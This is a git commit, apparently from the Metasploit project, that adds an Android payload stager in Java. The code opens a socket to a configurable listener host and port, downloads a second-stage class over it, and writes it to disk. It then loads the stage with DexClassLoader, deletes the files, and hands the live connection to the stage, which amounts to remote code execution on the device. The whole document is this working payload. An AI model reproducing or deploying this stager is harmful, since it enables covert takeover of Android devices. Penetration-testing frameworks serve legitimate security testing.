e9b07f0d7cb1c7f44f63e42d3a7fb2b4e8b84563
Tim <timrlw@gmail.com>
2013-10-05 22:19:18 +0100

    the Android Context should be optional

---
+++ java/androidpayload/app/src/com/metasploit/stage/Payload.java
@@ -0,0 +1,71 @@
+package com.metasploit.stage;//package com.metasploit.stage;
+
+import android.content.Context;
+
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+import dalvik.system.DexClassLoader;
+
+public class Payload {
+
+    private static final String LHOST = "XXXX127.0.0.1                       ";
+    private static final String LPORT = "YYYY4444                            ";
+
+    public static Context context;
+
+    public static void main(String[] args) {
+        try {
+            String lhost = LHOST.substring(4).trim();
+            String lport = LPORT.substring(4).trim();
+            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
+            DataInputStream in = new DataInputStream(msgsock.getInputStream());
+            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
+
+            String path = new File(".").getAbsolutePath();
+            String filePath = path + File.separatorChar + "payload.jar";
+            String dexPath = path + File.separatorChar + "payload.dex";
+
+            // Read the class name
+            int coreLen = in.readInt();
+            byte[] core = new byte[coreLen];
+            in.readFully(core);
+            String classFile = new String(core);
+
+            // Read the stage
+            coreLen = in.readInt();
+            core = new byte[coreLen];
+            in.readFully(core);
+
+            File file = new File(filePath);
+            if (!file.exists()) {
+                file.createNewFile();
+            }
+            FileOutputStream fop = new FileOutputStream(file);
+            fop.write(core);
+            fop.flush();
+            fop.close();
+
+            // Load the stage
+            DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader());
+            Class<?> myClass = classLoader.loadClass(classFile);
+            final Object stage = myClass.newInstance();
+            file.delete();
+            new File(dexPath).delete();
+            myClass.getMethod("start", new Class[]{
+                    DataInputStream.class, OutputStream.class, Context.class, String[].class
+            }).invoke(stage, new Object[]{
+                    in, out, context, new String[] {},
+            });
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
